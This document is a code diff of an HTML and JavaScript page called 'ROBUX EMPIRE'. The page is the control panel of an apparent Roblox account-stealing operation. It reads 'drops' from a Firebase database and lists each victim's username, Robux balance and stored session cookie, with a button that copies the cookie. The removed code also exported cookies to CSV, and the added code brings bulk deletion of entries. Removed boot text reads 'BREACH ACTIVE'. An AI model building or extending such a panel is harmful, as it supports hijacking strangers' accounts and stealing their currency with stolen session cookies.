@@ -9,7 +9,6 @@
   <style>
     @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@600;700;800&display=swap');
     
-    /* SMOOTH COOL GRADIENT BACKGROUND */
     body {
       margin: 0;
       background: linear-gradient(135deg, #1a1a2e, #16213e, #0f3460, #1e90ff);
@@ -26,195 +25,51 @@
       100% { background-position: 0% 50%; }
     }
 
-    /* EPIC CENTERED DRAGON (STANDING, GLOWING) */
     .dragon-container {
       position: fixed;
-      top: 50%;
-      left: 50%;
+      top: 50%; left: 50%;
       transform: translate(-50%, -50%);
-      width: 500px;
-      height: 400px;
-      z-index: -1;
-      pointer-events: none;
+      width: 500px; height: 400px;
+      z-index: -1; pointer-events: none;
       filter: drop-shadow(0 0 40px rgba(30, 144, 255, 0.8));
       animation: dragonPulse 6s ease-in-out infinite;
     }
     @keyframes dragonPulse {
-      0%, 100% { transform: translate(-50%, -50%) scale(1); filter: drop-shadow(0 0 40px rgba(30,144,255,0.8)); }
+      0%, 100% { transform: translate(-50%, -50%) scale(1); }
       50% { transform: translate(-50%, -50%) scale(1.05); filter: drop-shadow(0 0 60px rgba(30,144,255,1)); }
     }
 
-    .login {
-      position: fixed;
-      top: 0; left: 0; width: 100%; height: 100%;
-      background: rgba(0,0,0,0.85);
-      display: flex;
-      flex-direction: column;
-      justify-content: center;
-      align-items: center;
-      z-index: 999;
-    }
-    .login h1 {
-      font-size: 64px;
-      color: #00d4ff;
-      text-shadow: 0 0 30px #00d4ff, 0 0 60px #0088cc;
-      letter-spacing: 2px;
-    }
-    .inputbox {
-      position: relative;
-      width: 420px;
-      margin: 18px;
-    }
-    .inputbox input {
-      padding: 22px;
-      font-size: 24px;
-      width: 100%;
-      border: 3px solid #00d4ff;
-      border-radius: 50px;
-      background: rgba(255,255,255,0.1);
-      color: #e0f7fa;
-      font-weight: bold;
-      text-align: center;
-      backdrop-filter: blur(5px);
-    }
-    .eye {
-      position: absolute;
-      right: 20px;
-      top: 22px;
-      cursor: pointer;
-      font-size: 28px;
-      color: #00d4ff;
-    }
-    .login button {
-      padding: 22px;
-      width: 420px;
-      font-size: 26px;
-      border: none;
-      border-radius: 50px;
-      background: linear-gradient(45deg, #00d4ff, #0088cc);
-      color: #000;
-      font-weight: 800;
-      cursor: pointer;
-      box-shadow: 0 0 50px rgba(0,212,255,0.8);
-      transition: all 0.3s;
-    }
-    .login button:hover {
-      transform: scale(1.08);
-      box-shadow: 0 0 80px rgba(0,212,255,1);
-    }
+    .login { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 999; }
+    .login h1 { font-size: 64px; color: #00d4ff; text-shadow: 0 0 30px #00d4ff, 0 0 60px #0088cc; letter-spacing: 2px; }
+    .inputbox { position: relative; width: 420px; margin: 18px; }
+    .inputbox input { padding: 22px; font-size: 24px; width: 100%; border: 3px solid #00d4ff; border-radius: 50px; background: rgba(255,255,255,0.1); color: #e0f7fa; font-weight: bold; text-align: center; backdrop-filter: blur(5px); }
+    .eye { position: absolute; right: 20px; top: 22px; cursor: pointer; font-size: 28px; color: #00d4ff; }
+    .login button { padding: 22px; width: 420px; font-size: 26px; border: none; border-radius: 50px; background: linear-gradient(45deg, #00d4ff, #0088cc); color: #000; font-weight: 800; cursor: pointer; box-shadow: 0 0 50px rgba(0,212,255,0.8); transition: all 0.3s; }
+    .login button:hover { transform: scale(1.08); box-shadow: 0 0 80px rgba(0,212,255,1); }
 
     .main { display: none; padding: 50px; min-height: 100vh; }
     .header { text-align: center; margin-bottom: 50px; }
-    .header h1 {
-      font-size: 72px;
-      color: #e0f7fa;
-      text-shadow: 0 0 40px #00d4ff, 0 0 80px #0088cc;
-    }
-    .total {
-      background: linear-gradient(45deg, rgba(0,212,255,0.2), rgba(0,136,204,0.2));
-      padding: 35px;
-      border-radius: 35px;
-      box-shadow: 0 0 70px rgba(0,212,255,0.6);
-      margin: 35px auto;
-      max-width: 850px;
-      text-align: center;
-      border: 1px solid rgba(0,212,255,0.4);
-    }
-    .total h2 {
-      font-size: 52px;
-      color: #e0f7fa;
-      text-shadow: 0 0 20px #00d4ff;
-    }
-    .total span {
-      font-size: 82px;
-      color: #00ff88;
-      font-weight: 900;
-      text-shadow: 0 0 30px #00ff88;
-    }
+    .header h1 { font-size: 72px; color: #e0f7fa; text-shadow: 0 0 40px #00d4ff, 0 0 80px #0088cc; }
+    .total { background: linear-gradient(45deg, rgba(0,212,255,0.2), rgba(0,136,204,0.2)); padding: 35px; border-radius: 35px; box-shadow: 0 0 70px rgba(0,212,255,0.6); margin: 35px auto; max-width: 850px; text-align: center; border: 1px solid rgba(0,212,255,0.4); }
+    .total h2 { font-size: 52px; color: #e0f7fa; text-shadow: 0 0 20px #00d4ff; }
+    .total span { font-size: 82px; color: #00ff88; font-weight: 900; text-shadow: 0 0 30px #00ff88; }
     .logs { max-width: 1300px; margin: 0 auto; }
-    .log {
-      background: rgba(255,255,255,0.08);
-      border-radius: 30px;
-      padding: 28px;
-      margin: 28px 0;
-      box-shadow: 0 0 50px rgba(0,212,255,0.4);
-      display: flex;
-      align-items: center;
-      transition: 0.4s;
-      border: 1px solid rgba(0,212,255,0.3);
-    }
-    .log:hover {
-      transform: translateY(-12px);
-      box-shadow: 0 0 90px rgba(0,212,255,0.8);
-    }
-    .avatar {
-      width: 130px;
-      height: 130px;
-      border-radius: 50%;
-      border: 6px solid #00d4ff;
-      box-shadow: 0 0 40px #00d4ff;
-      margin-right: 35px;
-    }
+    .log { background: rgba(255,255,255,0.08); border-radius: 30px; padding: 28px; margin: 28px 0; box-shadow: 0 0 50px rgba(0,212,255,0.4); display: flex; align-items: center; transition: 0.4s; border: 1px solid rgba(0,212,255,0.3); position: relative; }
+    .log:hover { transform: translateY(-12px); box-shadow: 0 0 90px rgba(0,212,255,0.8); }
+    .log.selected { background: rgba(255,0,0,0.2); border: 2px solid #ff6b6b; }
+    .avatar { width: 130px; height: 130px; border-radius: 50%; border: 6px solid #00d4ff; box-shadow: 0 0 40px #00d4ff; margin-right: 35px; }
     .info { flex: 1; }
-    .info h3 {
-      font-size: 34px;
-      color: #e0f7fa;
-      margin: 0;
-    }
-    .info p {
-      font-size: 20px;
-      color: #b2ebf2;
-      margin: 8px 0;
-    }
-    .robux {
-      color: #00ff88;
-      font-weight: 900;
-      font-size: 30px;
-    }
-    .copy {
-      background: linear-gradient(45deg, #00d4ff, #0088cc);
-      color: #000;
-      padding: 16px 32px;
-      border-radius: 50px;
-      font-weight: bold;
-      cursor: pointer;
-      box-shadow: 0 0 35px rgba(0,212,255,0.7);
-      transition: 0.3s;
-    }
-    .copy:hover {
-      background: #00ff88;
-      box-shadow: 0 0 50px #00ff88;
-    }
-    .loading {
-      text-align: center;
-      color: #00d4ff;
-      font-size: 26px;
-      margin: 50px;
-      animation: pulse 1.8s infinite;
-    }
-    .error {
-      color: #ff6b6b;
-      font-weight: bold;
-      text-align: center;
-      margin: 50px;
-    }
+    .info h3 { font-size: 34px; color: #e0f7fa; margin: 0; }
+    .info p { font-size: 20px; color: #b2ebf2; margin: 8px 0; }
+    .robux { color: #00ff88; font-weight: 900; font-size: 30px; }
+    .copy { background: linear-gradient(45deg, #00d4ff, #0088cc); color: #000; padding: 16px 32px; border-radius: 50px; font-weight: bold; cursor: pointer; box-shadow: 0 0 35px rgba(0,212,255,0.7); transition: 0.3s; }
+    .copy:hover { background: #00ff88; box-shadow: 0 0 50px #00ff88; }
+    .loading { text-align: center; color: #00d4ff; font-size: 26px; margin: 50px; animation: pulse 1.8s infinite; }
+    @keyframes pulse { 0%{opacity:0.6}50%{opacity:1}100%{opacity:0.6} }
+    .error { color: #ff6b6b; font-weight: bold; text-align: center; margin: 50px; }
 
-    /* DARK MODE */
-    .dark body {
-      background: linear-gradient(135deg, #0a0a1a, #0f0f2e, #1a1a3e, #16213e);
-      animation: gradientShiftDark 15s ease infinite;
-    }
-    @keyframes gradientShiftDark {
-      0% { background-position: 0% 50%; }
-      50% { background-position: 100% 50%; }
-      100% { background-position: 0% 50%; }
-    }
-    .dark .dragon path { fill: #00ff88; filter: drop-shadow(0 0 30px #00ff88); }
-    .dark .total span { color: #00ff88; }
-    .dark .robux { color: #00ff88; }
-
-    /* 20 NEW FEATURES STYLES */
-    #darkModeBtn, #scrollTopBtn {
+    /* CONTROLS */
+    #darkModeBtn, #scrollTopBtn, #selectModeBtn, #deleteBtn {
       position: fixed;
       padding: 14px 28px;
       background: linear-gradient(45deg, #00d4ff, #0088cc);
@@ -228,61 +83,36 @@
       font-family: Poppins;
       transition: 0.3s;
     }
-    #darkModeBtn:hover, #scrollTopBtn:hover {
+    #darkModeBtn:hover, #scrollTopBtn:hover, #selectModeBtn:hover, #deleteBtn:hover {
       transform: scale(1.1);
       box-shadow: 0 0 60px rgba(0,212,255,1);
     }
     #darkModeBtn { top: 25px; right: 25px; }
     #scrollTopBtn { bottom: 30px; right: 30px; }
+    #selectModeBtn { top: 25px; right: 180px; }
+    #deleteBtn { top: 25px; right: 340px; background: #ff6b6b; display: none; }
+    #deleteBtn:hover { background: #ff4444; }
 
-    #search { width:90%; max-width:500px; margin:25px auto; display:block; padding:16px; border-radius:50px; font-size:18px; background:rgba(255,255,255,0.1); color:#e0f7fa; border:2px solid #00d4ff; text-align:center; }
-    #countdown { text-align:center; color:#00d4ff; font-size:22px; margin:20px; }
-    #uptime { text-align:center; color:#00d4ff; font-size:18px; margin:15px; }
-    #level { font-size:50px; color:#00d4ff; margin-left:20px; }
-    #crown { position:absolute; top:-60px; left:50%; transform:translateX(-50%); font-size:70px; opacity:0; transition:opacity 1s; }
-    .top3 { background:rgba(0,212,255,0.15); padding:25px; border:2px solid #00d4ff; border-radius:25px; margin:30px auto; max-width:800px; text-align:center; }
-    .top3 h2 { color:#00d4ff; font-size:32px; margin:0; }
-    .top3 p { color:#00ff88; font-size:22px; margin:10px 0; }
-    canvas#stars { position:fixed; top:0; left:0; width:100%; height:100%; z-index:-1; pointer-events:none; }
-    #boot { position:fixed; top:0; left:0; width:100%; height:100%; background:#0a0a1a; color:#00d4ff; font-family:monospace; display:flex; flex-direction:column; justify-content:center; align-items:center; z-index:1000; transition:opacity 1s; }
-    #boot h1 { font-size:48px; margin:10px; }
-    #boot p { font-size:20px; }
-    .notification { position:fixed; top:20px; left:50%; transform:translateX(-50%); background:#00ff88; color:#000; padding:15px 30px; border-radius:50px; font-weight:800; box-shadow:0 0 40px #00ff88; z-index:9999; opacity:0; transition:opacity 0.5s; }
-    .stats { display:flex; justify-content:center; gap:30px; margin:30px 0; flex-wrap:wrap; }
-    .stat { background:rgba(0,212,255,0.2); padding:20px; border-radius:20px; text-align:center; min-width:180px; border:1px solid rgba(0,212,255,0.4); }
-    .stat h3 { margin:0; color:#00d4ff; font-size:20px; }
-    .stat p { margin:8px 0 0; color:#00ff88; font-size:28px; font-weight:900; }
-    .sort-btn { background:#00d4ff; color:#000; padding:12px 24px; border-radius:50px; margin:10px; cursor:pointer; font-weight:800; }
-    .sort-btn.active { background:#00ff88; }
-    .filter-tags { text-align:center; margin:20px; }
-    .tag { background:rgba(0,212,255,0.2); color:#00d4ff; padding:8px 16px; border-radius:50px; margin:5px; cursor:pointer; font-size:14px; }
-    .tag.active { background:#00ff88; color:#000; }
-    .export-btn { background:#00ff88; color:#000; padding:12px 24px; border-radius:50px; margin:20px auto; display:block; width:200px; text-align:center; cursor:pointer; font-weight:800; }
-    .theme-btn { background:rgba(255,255,255,0.1); color:#e0f7fa; padding:10px 20px; border-radius:50px; margin:10px; cursor:pointer; border:1px solid #00d4ff; }
-    .theme-btn.active { background:#00d4ff; color:#000; }
-    .progress-bar { height:8px; background:rgba(0,212,255,0.3); border-radius:4px; margin:20px auto; max-width:600px; overflow:hidden; }
-    .progress { height:100%; width:0%; background:#00ff88; border-radius:4px; transition:width 0.5s; }
+    .checkbox { position: absolute; top: 20px; left: 20px; width: 24px; height: 24px; border: 3px solid #00d4ff; border-radius: 6px; cursor: pointer; display: none; }
+    .checkbox:checked { background: #00ff88; border-color: #00ff88; }
+
     .live-indicator { position:fixed; top:25px; left:25px; width:12px; height:12px; background:#00ff88; border-radius:50%; box-shadow:0 0 20px #00ff88; animation:blink 1.5s infinite; }
     @keyframes blink { 0%,100% { opacity:1; } 50% { opacity:0.3; } }
     .footer { text-align:center; padding:30px; color:#00d4ff; font-size:14px; margin-top:50px; }
-    .mobile-menu { display:none; position:fixed; bottom:0; left:0; width:100%; background:rgba(0,0,0,0.9); padding:15px; justify-content:space-around; z-index:100; }
-    .mobile-menu button { background:#00d4ff; color:#000; border:none; padding:12px 20px; border-radius:50px; font-weight:800; }
+
     @media(max-width:768px){
       .log{flex-direction:column;text-align:center;}
       .avatar{margin:0 auto 20px;}
       .inputbox,.login button{width:90%!important;}
-      .total{font-size:70%!important;}
-      .mobile-menu{display:flex;}
-      #darkModeBtn, #scrollTopBtn{display:none;}
+      #darkModeBtn, #scrollTopBtn, #selectModeBtn, #deleteBtn { position: static; display: inline-block; margin: 10px; }
+      #selectModeBtn, #deleteBtn { position: relative; top: auto; right: auto; }
     }
   </style>
 </head>
 <body>
 
-  <!-- LIVE INDICATOR -->
   <div class="live-indicator"></div>
 
-  <!-- EPIC CENTERED DRAGON -->
   <div class="dragon-container">
     <svg viewBox="0 0 500 400" xmlns="http://www.w3.org/2000/svg">
       <ellipse cx="250" cy="220" rx="100" ry="120" fill="#2c3e50" stroke="#1a252f" stroke-width="4"/>
@@ -303,21 +133,10 @@
     </svg>
   </div>
 
-  <!-- BOOT ANIMATION -->
-  <div id="boot">
-    <h1>INITIALIZING EMPIRE...</h1>
-    <p>BREACH ACTIVE | VAULT SYNC | 1.2M R$ LOADED</p>
-  </div>
-
-  <!-- NOTIFICATION TOAST -->
-  <div id="notif" class="notification"></div>
-
-  <!-- STARS BACKGROUND -->
-  <canvas id="stars"></canvas>
-
-  <!-- CONTROLS -->
   <button id="darkModeBtn" onclick="toggleDarkMode()">DARK MODE</button>
   <button id="scrollTopBtn" onclick="window.scrollTo({top:0,behavior:'smooth'})">TOP</button>
+  <button id="selectModeBtn" onclick="toggleSelectMode()">SELECT MODE</button>
+  <button id="deleteBtn" onclick="deleteSelected()">DELETE SELECTED</button>
 
   <div class="login" id="login">
     <h1>ROBUX EMPIRE</h1>
@@ -330,57 +149,20 @@
 
   <div class="main" id="main">
     <div class="header">
-      <h1>TOTAL ROBUX: <span id="total">0</span> <span id="level">[BARON]</span></h1>
-      <div id="crown">Crown</div>
+      <h1>TOTAL ROBUX: <span id="total">0</span></h1>
     </div>
-
-    <input type="text" id="search" placeholder="Search user..." onkeyup="filter()">
-
-    <div class="filter-tags">
-      <span class="tag active" onclick="filterTag('all')">ALL</span>
-      <span class="tag" onclick="filterTag('high')">HIGH VALUE</span>
-      <span class="tag" onclick="filterTag('new')">NEW</span>
+    <div class="total">
+      <h2>EMPIRE VALUE</h2>
+      <span id="total2">0</span> Robux
     </div>
-
-    <div class="stats">
-      <div class="stat"><h3>ACCOUNTS</h3><p id="count">0</p></div>
-      <div class="stat"><h3>AVG ROBUX</h3><p id="avg">0</p></div>
-      <div class="stat"><h3>UPTIME</h3><p id="uptime">0h 0m</p></div>
-      <div class="stat"><h3>NEXT SYNC</h3><p id="countdown">5s</p></div>
-    </div>
-
-    <div class="progress-bar"><div class="progress" id="progress"></div></div>
-
-    <div style="text-align:center;">
-      <button class="sort-btn active" onclick="sort('robux')">SORT BY ROBUX</button>
-      <button class="sort-btn" onclick="sort('date')">SORT BY DATE</button>
-    </div>
-
-    <div id="top3"></div>
-
     <div class="logs" id="logs">
       <div class="loading">EMPIRE SYNCING... (15 sec max)</div>
     </div>
-
-    <button class="export-btn" onclick="exportData()">EXPORT CSV</button>
-
-    <div style="text-align:center; margin:30px;">
-      <button class="theme-btn active" onclick="setTheme('blue')">BLUE</button>
-      <button class="theme-btn" onclick="setTheme('purple')">PURPLE</button>
-      <button class="theme-btn" onclick="setTheme('gold')">GOLD</button>
-    </div>
-
     <div class="error" id="error" style="display:none;"></div>
   </div>
 
   <div class="footer">
     © 2025 FlamesAXRCH Empire | Cairo, Egypt | All Systems Operational
-  </div>
-
-  <div class="mobile-menu">
-    <button onclick="toggleDarkMode()">Dark</button>
-    <button onclick="window.scrollTo({top:0,behavior:'smooth'})">Top</button>
-    <button onclick="exportData()">Export</button>
   </div>
 
   <script>
@@ -396,32 +178,9 @@
     };
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
-    let lastCount = 0, dataCache = [], sortMode = 'robux', filterMode = 'all', theme = 'blue';
-
-    // 1. BOOT ANIMATION
-    setTimeout(() => {
-      document.getElementById('boot').style.opacity = '0';
-      setTimeout(() => document.getElementById('boot').remove(), 1000);
-    }, 3000);
-
-    // 2. STARS BACKGROUND
-    const canvas = document.getElementById('stars');
-    const ctx = canvas.getContext('2d');
-    canvas.width = innerWidth; canvas.height = innerHeight;
-    const stars = Array.from({length:80},()=>({x:Math.random()*canvas.width,y:Math.random()*canvas.height,r:Math.random()*1.5+0.5,s:Math.random()*0.5+0.1}));
-    function drawStars(){ ctx.clearRect(0,0,canvas.width,canvas.height); stars.forEach(s=>{ctx.fillStyle=`rgba(0,212,255,${s.s})`;ctx.beginPath();ctx.arc(s.x,s.y,s.r,0,Math.PI*2);ctx.fill();}); requestAnimationFrame(drawStars); } drawStars();
-    window.onresize = () => { canvas.width = innerWidth; canvas.height = innerHeight; };
-
-    // 3. UPTIME COUNTER
-    let start = Date.now();
-    setInterval(() => {
-      let diff = Math.floor((Date.now() - start)/1000);
-      let h = Math.floor(diff/3600), m = Math.floor((diff%3600)/60);
-      document.getElementById('uptime').textContent = `${h}h ${m}m`;
-    }, 1000);
-
-    // 4. COUNTDOWN
-    let sec=5; setInterval(()=>{document.getElementById('countdown').textContent=`${--sec}s`; if(sec<=0)sec=5;},1000);
+    let lastCount = 0;
+    let selectMode = false;
+    let selectedIds = new Set();
 
     function toggleKey() {
       const i = document.getElementById('key');
@@ -441,160 +200,113 @@
       }
     }
 
-    function animateValue(id, start, end, duration) {
-      let obj = document.getElementById(id);
-      let startTime = null;
-      function step(now) {
-        if (!startTime) startTime = now;
-        let progress = Math.min((now - startTime) / duration, 1);
-        obj.textContent = Math.floor(progress * (end - start) + start).toLocaleString();
-        if (progress < 1) requestAnimationFrame(step);
+    function toggleSelectMode() {
+      selectMode = !selectMode;
+      const btn = document.getElementById('selectModeBtn');
+      btn.textContent = selectMode ? 'CANCEL' : 'SELECT MODE';
+      btn.style.background = selectMode ? '#ff6b6b' : 'linear-gradient(45deg, #00d4ff, #0088cc)';
+      document.getElementById('deleteBtn').style.display = selectMode ? 'block' : 'none';
+      document.querySelectorAll('.checkbox').forEach(cb => cb.style.display = selectMode ? 'block' : 'none');
+      document.querySelectorAll('.log').forEach(log => log.classList.remove('selected'));
+      selectedIds.clear();
+    }
+
+    function toggleSelect(id, checkbox) {
+      if (!selectMode) return;
+      if (checkbox.checked) {
+        selectedIds.add(id);
+        checkbox.parentElement.classList.add('selected');
+      } else {
+        selectedIds.delete(id);
+        checkbox.parentElement.classList.remove('selected');
       }
-      requestAnimationFrame(step);
+      document.getElementById('deleteBtn').textContent = `DELETE (${selectedIds.size})`;
+    }
+
+    function deleteSelected() {
+      if (selectedIds.size === 0) return;
+      if (!confirm(`Delete ${selectedIds.size} account(s)?`)) return;
+
+      const updates = {};
+      selectedIds.forEach(id => {
+        updates[`drops/${id}`] = null;
+      });
+
+      db.ref().update(updates).then(() => {
+        showNotif(`DELETED ${selectedIds.size} ACCOUNT(S)`);
+        selectedIds.clear();
+        toggleSelectMode();
+        load();
+      }).catch(err => {
+        showNotif('DELETE FAILED');
+        console.error(err);
+      });
     }
 
     function showNotif(text) {
-      const n = document.getElementById('notif');
+      const n = document.createElement('div');
       n.textContent = text;
-      n.style.opacity = '1';
-      setTimeout(() => n.style.opacity = '0', 2000);
+      n.style.cssText = 'position:fixed;top:20px;left:50%;transform:translateX(-50%);background:#00ff88;color:#000;padding:15px 30px;border-radius:50px;font-weight:800;box-shadow:0 0 40px #00ff88;z-index:9999;opacity:0;transition:opacity 0.5s;';
+      document.body.appendChild(n);
+      setTimeout(() => n.style.opacity = '1', 100);
+      setTimeout(() => { n.style.opacity = '0'; setTimeout(() => n.remove(), 500); }, 2000);
     }
 
     function load() {
       db.ref('drops').once('value').then(s => {
         const data = s.val() || {};
-        dataCache = Object.values(data);
-        let total = 0, count = dataCache.length;
-        dataCache.forEach(c => total += Number(c.robux));
+        const entries = Object.entries(data).map(([id, val]) => ({ id, ...val }));
+        const total = entries.reduce((sum, c) => sum + Number(c.robux), 0);
 
-        // 5. ANIMATED COUNTER
-        animateValue('total', parseInt(document.getElementById('total').textContent.replace(/,/g,'')), total, 800);
-        animateValue('total2', parseInt(document.getElementById('total2').textContent.replace(/,/g,'')), total, 800);
+        // NEWEST FIRST
+        entries.sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0));
 
-        // 6. STATS
-        document.getElementById('count').textContent = count;
-        document.getElementById('avg').textContent = count ? Math.floor(total/count).toLocaleString() : 0;
+        const totalEl = document.getElementById('total');
+        const total2El = document.getElementById('total2');
+        if (totalEl) animateValue(totalEl, parseInt(totalEl.textContent.replace(/,/g,'')) || 0, total, 800);
+        if (total2El) animateValue(total2El, parseInt(total2El.textContent.replace(/,/g,'')) || 0, total, 800);
 
-        // 7. LEVEL + CROWN
-        const level = total > 5e6 ? 'GOD' : total > 1e6 ? 'KING' : total > 500000 ? 'LORD' : 'BARON';
-        document.getElementById('level').textContent = `[${level}]`;
-        document.getElementById('crown').style.opacity = total > 1e6 ? '1' : '0';
-
-        // 8. PROGRESS BAR
-        const progress = Math.min((total / 10000000) * 100, 100);
-        document.getElementById('progress').style.width = progress + '%';
-
-        // 9. TOP 3
-        const top3 = dataCache.sort((a,b)=>b.robux-a.robux).slice(0,3);
-        document.getElementById('top3').innerHTML = top3.length ? `
-          <div class="top3">
-            <h2>TOP 3 RICHEST</h2>
-            ${top3.map((u,i)=>`<p>#${i+1} ${u.user} — ${u.robux.toLocaleString()} R$</p>`).join('')}
-          </div>` : '';
-
-        // 10. LOGS + TAGS
-        const html = dataCache.map((c, i) => {
-          const isHigh = Number(c.robux) > 100000;
-          const isNew = i >= dataCache.length - 3;
-          return `<div class="log" data-robux="${c.robux}" data-date="${c.date||0}" data-high="${isHigh}" data-new="${isNew}">
+        const html = entries.map(c => `
+          <div class="log" onclick="if(selectMode) document.getElementById('cb_${c.id}').click()">
+            <input type="checkbox" id="cb_${c.id}" class="checkbox" onchange="toggleSelect('${c.id}', this)">
             <img src="${c.headshot}" class="avatar" onerror="this.src='https://i.imgur.com/removed.png'">
             <div class="info">
               <h3>${c.user} (@${c.display})</h3>
               <p class="robux">${Number(c.robux).toLocaleString()} Robux</p>
-              <button class="copy" onclick="copyCookie('${c.cookie}', this)">COPY</button>
+              <button class="copy" onclick="event.stopPropagation(); navigator.clipboard.writeText('${c.cookie}'); showNotif('COPIED!')">COPY</button>
             </div>
-          </div>`;
-        });
-        document.getElementById('logs').innerHTML = html.join('') || "<h1 style='color:#e0f7fa;'>WAITING FOR DROP</h1>";
+          </div>`).join('');
 
-        applyFiltersAndSort();
+        const logs = document.getElementById('logs');
+        if (logs) logs.innerHTML = html || "<h1 style='color:#e0f7fa;'>WAITING FOR DROP</h1>";
 
-        // 11. NEW DROP ALERT
-        if (dataCache.length > lastCount) {
+        if (entries.length > lastCount) {
           const audio = new Audio('https://cdn.discordapp.com/attachments/1298475629385744394/1298475688884625420/alert.mp3');
           audio.play().catch(() => {});
-          showNotif(`+${dataCache.length - lastCount} NEW DROP(S)!`);
+          showNotif(`+${entries.length - lastCount} NEW DROP(S)!`);
         }
-        lastCount = dataCache.length;
-        document.getElementById('error').style.display = 'none';
+        lastCount = entries.length;
+
+        const errorEl = document.getElementById('error');
+        if (errorEl) errorEl.style.display = 'none';
       }).catch(err => {
-        document.getElementById('error').textContent = 'DB ERROR: ' + err.message;
-        document.getElementById('error').style.display = 'block';
+        const errorEl = document.getElementById('error');
+        if (errorEl) {
+          errorEl.textContent = 'DB ERROR: ' + err.message;
+          errorEl.style.display = 'block';
+        }
       });
     }
 
-    function copyCookie(cookie, btn) {
-      navigator.clipboard.writeText(cookie);
-      const old = btn.textContent;
-      btn.textContent = 'COPIED!';
-      btn.style.background = '#00ff88';
-      btn.style.transform = 'scale(1.2)';
-      setTimeout(()=>{ btn.textContent=old; btn.style.background=''; btn.style.transform=''; }, 1500);
-      showNotif('COOKIE COPIED!');
-    }
-
-    function filter() {
-      const q = document.getElementById('search').value.toLowerCase();
-      document.querySelectorAll('.log').forEach(l => {
-        const name = l.querySelector('h3').textContent.toLowerCase();
-        l.style.display = name.includes(q) ? 'flex' : 'none';
-      });
-    }
-
-    function filterTag(tag) {
-      filterMode = tag;
-      document.querySelectorAll('.tag').forEach(t => t.classList.remove('active'));
-      event.target.classList.add('active');
-      applyFiltersAndSort();
-    }
-
-    function sort(mode) {
-      sortMode = mode;
-      document.querySelectorAll('.sort-btn').forEach(b => b.classList.remove('active'));
-      event.target.classList.add('active');
-      applyFiltersAndSort();
-    }
-
-    function applyFiltersAndSort() {
-      let filtered = dataCache;
-      if (filterMode === 'high') filtered = filtered.filter(c => Number(c.robux) > 100000);
-      if (filterMode === 'new') filtered = filtered.filter((c, i) => i >= dataCache.length - 3);
-
-      filtered.sort((a,b) => sortMode === 'robux' ? b.robux - a.robux : (b.date||0) - (a.date||0));
-
-      const container = document.getElementById('logs');
-      container.innerHTML = '';
-      filtered.forEach(c => {
-        const div = document.createElement('div');
-        div.className = 'log';
-        div.innerHTML = `<img src="${c.headshot}" class="avatar" onerror="this.src='https://i.imgur.com/removed.png'">
-          <div class="info"><h3>${c.user} (@${c.display})</h3><p class="robux">${Number(c.robux).toLocaleString()} Robux</p>
-          <button class="copy" onclick="copyCookie('${c.cookie}', this)">COPY</button></div>`;
-        container.appendChild(div);
-      });
-    }
-
-    function exportData() {
-      let csv = "Username,Display,Robux,Cookie\n";
-      dataCache.forEach(c => {
-        csv += `${c.user},${c.display},${c.robux},${c.cookie}\n`;
-      });
-      const blob = new Blob([csv], { type: 'text/csv' });
-      const url = URL.createObjectURL(blob);
-      const a = document.createElement('a');
-      a.href = url; a.download = 'robux_empire_export.csv'; a.click();
-      showNotif('EXPORTED CSV!');
-    }
-
-    function setTheme(t) {
-      theme = t;
-      document.querySelectorAll('.theme-btn').forEach(b => b.classList.remove('active'));
-      event.target.classList.add('active');
-      const root = document.documentElement;
-      if(t==='purple') root.style.setProperty('--primary', '#9c27b0');
-      else if(t==='gold') root.style.setProperty('--primary', '#ff8f00');
-      else root.style.setProperty('--primary', '#00d4ff');
-      showNotif(`THEME: ${t.toUpperCase()}`);
+    function animateValue(el, start, end, duration) {
+      let startTime = null;
+      function step(now) {
+        if (!startTime) startTime = now;
+        let progress = Math.min((now - startTime) / duration, 1);
+        el.textContent = Math.floor(progress * (end - start) + start).toLocaleString();
+        if (progress < 1) requestAnimationFrame(step);
+      }
+      requestAnimationFrame(step);
     }
 
     function toggleDarkMode() {
@@ -608,7 +320,8 @@
     window.addEventListener('load', () => {
       if (localStorage.getItem('darkMode') === 'true') {
         document.body.classList.add('dark');
-        document.getElementById('darkModeBtn').textContent = 'LIGHT MODE';
+        const btn = document.getElementById('darkModeBtn');
+        if (btn) btn.textContent = 'LIGHT MODE';
       }
     });
   </script>
